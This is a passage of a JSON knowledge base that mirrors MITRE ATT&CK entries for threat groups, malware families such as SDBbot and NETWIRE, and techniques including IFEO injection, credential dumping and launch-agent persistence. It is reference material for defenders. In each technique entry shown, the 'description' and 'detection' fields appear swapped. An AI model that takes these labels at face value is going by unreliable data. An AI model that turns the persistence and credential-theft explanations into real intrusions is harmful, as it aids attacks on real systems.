                    "T1078": "Valid Accounts",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0564",
            "type": "tool",
            "attributes": {
                "name": "BlackMould",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "BlackMould is a web shell based on China Chopper for servers running Microsoft IIS. First reported in December 2019, it has been used in malicious campaigns by GALLIUM against telecommunication providers.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 6
        },
        {
            "id": "T1053.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "At (Windows)",
                "chain_phase": "execution",
                "description": "Monitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data.",
                "detection": "Adversaries may abuse the <code>at.exe</code> utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows for scheduling tasks at a specified time and date. Using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. \n\nAn adversary may use <code>at.exe</code> in Windows environments to execute programs at system startup or on a scheduled basis for persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).\n\nNote: The <code>at.exe</code> command line utility has been deprecated in current versions of Windows in favor of <code>schtasks</code>.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0110",
            "type": "tool",
            "attributes": {
                "name": "at",
                "aliases": [
                    "at.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "at is used to schedule tasks on a system to run at a specified date or time.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1053.002": "At (Windows)"
                }
            },
            "val": 1
        },
        {
            "id": "S0106",
            "type": "tool",
            "attributes": {
                "name": "cmd",
                "aliases": [
                    "cmd.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "cmd is the Windows command-line interpreter that can be used to interact with systems and execute other processes and utilities. \n\nCmd.exe contains native functionality to perform many operations to interact with the system, including listing files in a directory (e.g., <code>dir</code> ), deleting files (e.g., <code>del</code> ), and copying files (e.g., <code>copy</code> ).",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1570": "Lateral Tool Transfer",
                    "T1059.003": "Windows Command Shell",
                    "T1070.004": "File Deletion",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery"
                }
            },
            "val": 6
        },
        {
            "id": "S0100",
            "type": "tool",
            "attributes": {
                "name": "ipconfig",
                "aliases": [
                    "ipconfig.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "ipconfig is a Windows utility that can be used to find information about a system's TCP/IP, DNS, DHCP, and adapter configuration.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 1
        },
        {
            "id": "S0075",
            "type": "tool",
            "attributes": {
                "name": "Reg",
                "aliases": [
                    "reg.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "Reg is a Windows utility used to interact with the Windows Registry. It can be used at the command-line interface to query, add, modify, and remove information. \n\nUtilities such as Reg are known to be used by persistent threats.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1552.002": "Credentials in Registry",
                    "T1112": "Modify Registry",
                    "T1012": "Query Registry"
                }
            },
            "val": 3
        },
        {
            "id": "S0040",
            "type": "tool",
            "attributes": {
                "name": "HTRAN",
                "aliases": [
                    "HUC Packet Transmit Tool"
                ],
                "labels": [
                    "tool"
                ],
                "description": "HTRAN is a tool that proxies connections through intermediate hops and aids users in disguising their true geographical location. It can be used by adversaries to hide their location when interacting with the victim networks.",
                "platforms": [
                    "Linux",
                    "Windows"
                ],
                "techniques": {
                    "T1090": "Proxy",
                    "T1055": "Process Injection",
                    "T1014": "Rootkit"
                }
            },
            "val": 3
        },
        {
            "id": "S0005",
            "type": "tool",
            "attributes": {
                "name": "Windows Credential Editor",
                "aliases": [
                    "WCE"
                ],
                "labels": [
                    "tool"
                ],
                "description": "Windows Credential Editor is a password dumping tool.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1003.001": "LSASS Memory"
                }
            },
            "val": 1
        },
        {
            "id": "G0092",
            "type": "group",
            "attributes": {
                "val": 8,
                "name": "TA505",
                "aliases": [
                    "Hive0065"
                ],
                "description": "TA505 is a financially motivated threat group that has been active since at least 2014. The group is known for frequently changing malware and driving global trends in criminal malware distribution.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0461": "SDBbot",
                    "S0460": "Get2",
                    "S0384": "Dridex",
                    "S0383": "FlawedGrace",
                    "S0382": "ServHelper",
                    "S0381": "FlawedAmmyy",
                    "S0266": "TrickBot",
                    "S0039": "Net"
                },
                "techniques": {
                    "T1553.005": "Mark-of-the-Web Bypass",
                    "T1059.007": "JavaScript",
                    "T1071.001": "Web Protocols",
                    "T1078.002": "Domain Accounts",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1568.001": "Fast Flux DNS",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1087.003": "Email Account",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1559.002": "Dynamic Data Exchange",
                    "T1553.002": "Code Signing",
                    "T1027.002": "Software Packing",
                    "T1552.001": "Credentials In Files",
                    "T1218.007": "Msiexec",
                    "T1218.011": "Rundll32",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1486": "Data Encrypted for Impact",
                    "T1105": "Ingress Tool Transfer",
                    "T1069": "Permission Groups Discovery",
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "T1546.012",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Image File Execution Options Injection",
                "chain_phase": "privilege-escalation",
                "description": "Monitor for abnormal usage of the GFlags tool as well as common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as <code>DEBUG_PROCESS</code> and <code>DEBUG_ONLY_THIS_PROCESS</code>. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nMonitor Registry values associated with IFEOs, as well as silent process exit monitoring, for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. (Citation: Elastic Process Injection July 2017)",
                "detection": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). \n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.  IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. \n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).   Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>.  \n\nSimilar to Accessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with Remote Desktop Protocol will cause the \"debugger\" program to be executed with SYSTEM privileges. \n\nSimilar to Process Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.  Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to Impair Defenses by registering invalid debuggers that redirect and effectively disable various system and security applications.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0461",
            "type": "tool",
            "attributes": {
                "name": "SDBbot",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "SDBbot is a backdoor with installer and loader components that has been used by TA505 since at least 2019.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1027.002": "Software Packing",
                    "T1070.004": "File Deletion",
                    "T1546.012": "Image File Execution Options Injection",
                    "T1546.011": "Application Shimming",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1125": "Video Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1070": "Indicator Removal on Host",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 20
        },
        {
            "id": "S0460",
            "type": "tool",
            "attributes": {
                "name": "Get2",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Get2 is a downloader written in C++ that has been used by TA505 to deliver FlawedGrace, FlawedAmmyy, Snatch and SDBbot.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1082": "System Information Discovery",
                    "T1059": "Command and Scripting Interpreter",
                    "T1057": "Process Discovery",
                    "T1033": "System Owner/User Discovery"
                }
            },
            "val": 6
        },
        {
            "id": "S0383",
            "type": "tool",
            "attributes": {
                "name": "FlawedGrace",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "FlawedGrace is a fully featured remote access tool (RAT) written in C++ that was first observed in late 2017.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1094": "Custom Command and Control Protocol",
                    "T1043": "Commonly Used Port",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 3
        },
        {
            "id": "S0382",
            "type": "tool",
            "attributes": {
                "name": "ServHelper",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "ServHelper is a backdoor first observed in late 2018. The backdoor is written in Delphi and is typically delivered as a DLL file.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1070.004": "File Deletion",
                    "T1136.001": "Local Account",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1053.005": "Scheduled Task",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery"
                }
            },
            "val": 14
        },
        {
            "id": "T1001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data Obfuscation",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "detection": "Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0381",
            "type": "tool",
            "attributes": {
                "name": "FlawedAmmyy",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "FlawedAmmyy is a remote access tool (RAT) that was first seen in early 2016. The code for FlawedAmmyy was based on leaked source code for a version of Ammyy Admin, a remote access software.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1069.001": "Local Groups",
                    "T1518.001": "Security Software Discovery",
                    "T1120": "Peripheral Device Discovery",
                    "T1082": "System Information Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1001": "Data Obfuscation"
                }
            },
            "val": 10
        },
        {
            "id": "G0091",
            "type": "group",
            "attributes": {
                "val": 3,
                "name": "Silence",
                "aliases": [
                    "WHISPER SPIDER"
                ],
                "description": "Silence is a financially motivated threat actor targeting financial institutions in different countries. The group was first seen in June 2016. Their main targets reside in Russia, Ukraine, Belarus, Azerbaijan, Poland and Kazakhstan. They compromised various banking systems, including the Russian Central Bank's Automated Workstation Client, ATMs, and card processing.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0363": "Empire",
                    "S0195": "SDelete",
                    "S0191": "Winexe"
                },
                "techniques": {
                    "T1059.007": "JavaScript",
                    "T1090.002": "External Proxy",
                    "T1571": "Non-Standard Port",
                    "T1204.002": "Malicious File",
                    "T1569.002": "Service Execution",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1003.001": "LSASS Memory",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1553.002": "Code Signing",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.001": "Compiled HTML File",
                    "T1053.005": "Scheduled Task",
                    "T1125": "Video Capture",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1078": "Valid Accounts",
                    "T1072": "Software Deployment Tools",
                    "T1055": "Process Injection",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery"
                }
            }
        },
        {
            "id": "S0195",
            "type": "tool",
            "attributes": {
                "name": "SDelete",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "SDelete is an application that securely deletes data in a way that makes it unrecoverable. It is part of the Microsoft Sysinternals suite of tools.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1070.004": "File Deletion",
                    "T1485": "Data Destruction"
                }
            },
            "val": 2
        },
        {
            "id": "G0090",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "WIRTE",
                "aliases": [],
                "description": "WIRTE is a threat group that has been active since at least August 2018. The group focuses on targeting Middle East defense and diplomats.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0363": "Empire"
                },
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.005": "Visual Basic",
                    "T1059.001": "PowerShell",
                    "T1218.010": "Regsvr32",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer"
                }
            }
        },
        {
            "id": "G0089",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "The White Company",
                "aliases": [],
                "description": "The White Company is a likely state-sponsored threat actor with advanced capabilities. From 2017 through 2018, the group led an espionage campaign called Operation Shaheen targeting government and military organizations in Pakistan.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0379": "Revenge RAT",
                    "S0198": "NETWIRE"
                },
                "techniques": {
                    "T1204.002": "Malicious File",
                    "T1566.001": "Spearphishing Attachment",
                    "T1518.001": "Security Software Discovery",
                    "T1027.002": "Software Packing",
                    "T1070.004": "File Deletion",
                    "T1203": "Exploitation for Client Execution",
                    "T1124": "System Time Discovery"
                }
            }
        },
        {
            "id": "T1202",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Indirect Command Execution",
                "chain_phase": "defense-evasion",
                "description": "Monitor and analyze logs from host-based detection mechanisms, such as Sysmon, for events such as process creations that include or are resulting from parameters associated with invoking programs/commands/files and/or spawning child processes/network connections. (Citation: RSA Forfiles Aug 2017)",
                "detection": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a Command and Scripting Interpreter, Run window, or via scripts.  \n\nAdversaries may abuse these features for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd or file extensions more commonly associated with malicious payloads.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "OS Credential Dumping",
                "chain_phase": "credential-access",
                "description": "### Windows\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002) access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.\n\nHash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [Mimikatz](https://attack.mitre.org/software/S0002). [PowerShell](https://attack.mitre.org/techniques/T1059/001) scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, (Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync. (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Note: Domain controllers may not log replication requests originating from the default domain controller account. (Citation: Harmj0y DCSync Sept 2015). Also monitor for network protocols  (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests (Citation: Microsoft SAMR) from IPs not associated with known domain controllers. (Citation: AdSecurity DCSync Sept 2015)\n\n### Linux\nTo obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path <code>/proc/<pid>/maps</code>, where the <code><pid></code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.",
                "detection": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\n\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "S0379",
            "type": "tool",
            "attributes": {
                "name": "Revenge RAT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Revenge RAT is a freely available remote access tool written in .NET (C#).",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1132.001": "Standard Encoding",
                    "T1102.002": "Bidirectional Communication",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1056.001": "Keylogging",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.005": "Mshta",
                    "T1053.005": "Scheduled Task",
                    "T1202": "Indirect Command Execution",
                    "T1125": "Video Capture",
                    "T1123": "Audio Capture",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1003": "OS Credential Dumping"
                }
            },
            "val": 19
        },
        {
            "id": "T1547.011",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Plist Modification",
                "chain_phase": "persistence",
                "description": "File system monitoring can determine if plist files are being modified. Users should not have permission to modify these in most cases. Some software tools like \"Knock Knock\" can detect persistence mechanisms and point to the specific files that are being referenced. This can be helpful to see what is actually being executed.\n\nAll the login items created via shared file lists are viewable by going to the Apple menu -> System Preferences -> Users & Groups -> Login items. This area (and the corresponding file locations) should be monitored and allowed for known good applications. Otherwise, Login Items are located in <code> Contents/Library/LoginItems </code> within an application bundle, so these paths should be monitored as well.(Citation: Adding Login Items)\n\nMonitor process execution for abnormal process execution resulting from modified plist files. Monitor utilities used to modify plist files or that take a plist file as an argument, which may indicate suspicious activity.",
                "detection": "Adversaries may modify plist files to run a program during system boot or user login. Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>/Library/Preferences</code> (which execute with elevated privileges) and <code>~/Library/Preferences</code> (which execute with a user's privileges). \n\nAdversaries can modify plist files to execute their code as part of establishing persistence. plists may also be used to elevate privileges since they may execute in the context of another user. \n\nA specific plist used for execution at login is <code>com.apple.loginitems.plist</code>. Applications under this plist run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them. Users have direct control over login items installed using a shared file list which are also visible in System Preferences . Some of these applications can open visible dialogs to the user, but they don’t all have to since there is an option to \"hide\" the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in  . The API method <code> SMLoginItemSetEnabled</code> can be used to set Login Items, but scripting languages like AppleScript can do this as well.",
                "is_subtype": true,
                "platforms": [
                    "macOS"
                ]
            }
        },
        {
            "id": "T1543.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Launch Agent",
                "chain_phase": "persistence",
                "description": "Monitor Launch Agent creation through additional plist files and utilities such as Objective-See’s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.",
                "detection": "Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>$HOME/Library/LaunchAgents</code>   . These launch agents have property list files which point to the executables that will be launched .\n \nAdversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories    . The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in  . They can be set up to execute when a specific user logs in (in the specific user’s directory structure) or when any user logs in (which requires administrator privileges).",
                "is_subtype": true,
                "platforms": [
                    "macOS"
                ]
            }
        },
        {
            "id": "T1053.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Cron",
                "chain_phase": "execution",
                "description": "Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.  \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement. ",
                "detection": "Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code. The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for persistence. <code>cron</code> can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1547.013",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "XDG Autostart Entries",
                "chain_phase": "persistence",
                "description": "Malicious XDG autostart entries may be detected by auditing file creation and modification events within the <code>/etc/xdg/autostart</code> and <code>~/.config/autostart</code> directories. Depending on individual configurations, defenders may need to query the environment variables <code>$XDG_CONFIG_HOME</code> or <code>$XDG_CONFIG_DIRS</code> to determine the paths of Autostart entries. Autostart entry files not associated with legitimate packages may be considered suspicious. Suspicious entries can also be identified by comparing entries to a trusted system baseline.\n \nSuspicious processes or scripts spawned in this manner will have a parent process of the desktop component implementing the XDG specification and will execute as the logged on user.",
                "detection": "Adversaries may modify XDG autostart entries to execute programs or commands during system boot. Linux desktop environments that are XDG compliant implement functionality for XDG autostart entries. These entries will allow an application to automatically start during the startup of a desktop environment after user logon. By default, XDG autostart entries are stored within the <code>/etc/xdg/autostart</code> or <code>~/.config/autostart</code> directories and have a .desktop file extension.\n\nWithin an XDG autostart entry file, the <code>Type</code> key specifies if the entry is an application (type 1), link (type 2) or directory (type 3). The <code>Name</code> key indicates an arbitrary name assigned by the creator and the <code>Exec</code> key indicates the application and command line arguments to execute.\n\nAdversaries may use XDG autostart entries to maintain persistence by executing malicious commands and payloads, such as remote access tools, during the startup of a desktop environment. Commands included in XDG autostart entries with execute after user logon in the context of the currently logged on user. Adversaries may also use Masquerading to make XDG autostart entries look as if they are associated with legitimate programs.",
                "is_subtype": true,
                "platforms": [
                    "Linux"
                ]
            }
        },
        {
            "id": "S0198",
            "type": "tool",
            "attributes": {
                "name": "NETWIRE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "NETWIRE is a publicly available, multiplatform remote administration tool (RAT) that has been used by criminal and APT groups since at least 2012.",
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1573": "Encrypted Channel",
                    "T1071.001": "Web Protocols",
                    "T1074.001": "Local Data Staging",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1059.005": "Visual Basic",
                    "T1059.004": "Unix Shell",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1564.001": "Hidden Files and Directories",
                    "T1560.003": "Archive via Custom Method",
                    "T1560": "Archive Collected Data",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1555": "Credentials from Password Stores",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.001": "Invalid Code Signature",
                    "T1027.002": "Software Packing",
                    "T1547.011": "Plist Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.001": "Launch Agent",
                    "T1055.012": "Process Hollowing",
                    "T1053.003": "Cron",
                    "T1053.005": "Scheduled Task",
                    "T1547.013": "XDG Autostart Entries",
                    "T1119": "Automated Collection",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1102": "Web Service",
                    "T1095": "Non-Application Layer Protocol",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
